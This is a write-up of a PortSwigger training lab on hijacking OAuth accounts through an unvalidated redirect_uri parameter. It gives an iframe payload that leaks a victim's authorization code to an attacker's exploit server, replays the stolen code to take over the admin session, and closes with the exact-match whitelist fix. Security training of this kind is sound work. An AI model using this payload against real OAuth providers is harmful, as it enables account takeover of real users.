# OAuth account hijacking via redirect_uri

**Category:** OAuth authentication
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

The `redirect_uri` parameter is the one piece of an OAuth authorization request that absolutely has
to be validated server-side, because it's the address the provider will hand a live credential to at
the end of the flow. Trust the client to specify it freely and you've built a generic code-delivery
service that will ship an authorization code — effectively a login — to anywhere an attacker asks.
This lab's OAuth provider does exactly that.

## The Target

The blog's social login runs standard authorization-code-grant OAuth: `GET /auth?client_id=...` at
the OAuth provider, login and consent, then a redirect back to `redirect_uri` carrying `?code=...`.
That code gets exchanged for a token and a session at the client's `/oauth-callback`. Critically, an
OAuth session at the provider persists independently of the blog's own session — once we'd logged in
once, a second visit to the authorization endpoint skipped straight past the login form and reissued
a fresh code without asking for credentials again.

## The Investigation

We logged into the blog, then logged out and back in, watching the OAuth flow both times in the
proxy history. The second pass was instant — no credential prompt — confirming an active session
cookie at the OAuth provider itself was enough to silently reauthorize and mint a new code. That
detail matters: it means any request to the authorization endpoint made by an already-authenticated
victim's browser succeeds without requiring any interaction from them.

With that established, the only remaining question was whether `redirect_uri` was actually checked
against anything. We took the most recent `GET /auth?client_id=...` request and tried supplying
arbitrary values for `redirect_uri` instead of the legitimate client callback. There was no error
and no rejection — whatever we put in was reflected straight into the redirect the provider issued
next. That's the whole vulnerability: the provider doesn't hold a whitelist of valid callback URLs
per client, or if it does, it doesn't enforce it.

## The Exploit

We pointed `redirect_uri` at our own exploit server and wrapped the resulting authorization URL in
an iframe:

```
<iframe src="OAUTH/auth?client_id=X&redirect_uri=ATTACKER_SERVER&response_type=code&scope=openid%20profile%20email">
```

Delivered to the admin, this makes the admin's browser hit the OAuth authorization endpoint while
carrying an active OAuth session — so the provider silently reissues a fresh authorization code and,
because our `redirect_uri` was accepted without question, sends that code straight to our exploit
server instead of the blog. The code showed up in the exploit server's access log moments later. We
pulled it out and replayed it against the blog's real callback:

```
GET /oauth-callback?code=STOLEN
```

The blog completed the token exchange as if the admin had authorized it normally, because as far as
the OAuth provider and the blog are concerned, that's exactly what happened — the code is
indistinguishable from one obtained legitimately. That gave us an authenticated admin session, and
from the admin panel we deleted `carlos`.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's official solution walks the identical path: notice the silent reauthorization on a
second login, send the authorization request to Repeater, confirm arbitrary `redirect_uri` values
are accepted and reflected into the redirect, point it at the exploit server to confirm code leakage,
then build the delivery iframe:

```
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```

— deliver it to the victim, recover the leaked code from the exploit server log, and use it at
`/oauth-callback?code=STOLEN-CODE` to complete the takeover. This is the same technique end to end,
built from the same payload shape.

The only real difference is delivery mechanics. PortSwigger's walkthrough builds and tests the
payload by hand in Burp Repeater and the exploit server's web form. We drove the discovery phase
with a throwaway `httpx` client (`follow_redirects=False`) to parse `client_id`, `redirect_uri`, and
`scope` straight out of the authorization redirect's query string, then posted the iframe body to the
exploit server's storage endpoint and pulled the leaked code back out of its access log with a
regex — the same sequence of HTTP requests, issued programmatically instead of clicked through a
GUI.

## What This Teaches Us

An authorization code is a bearer credential for a login, valid for one use, and `redirect_uri` is
the only thing that determines who receives it. Validating it loosely — or not at all — turns the
provider into an open delivery mechanism for that credential: point it anywhere, and anywhere is
where the code goes. The fix is a strict, exact-match whitelist of registered redirect URIs per
`client_id`, checked server-side before any redirect is issued — not a prefix match, not a
same-domain check, an exact string comparison. Every other technique in this OAuth series that
starts with a `redirect_uri` manipulation exists because that whitelist was implemented as something
looser than exact match; this lab is what happens when it isn't implemented at all.
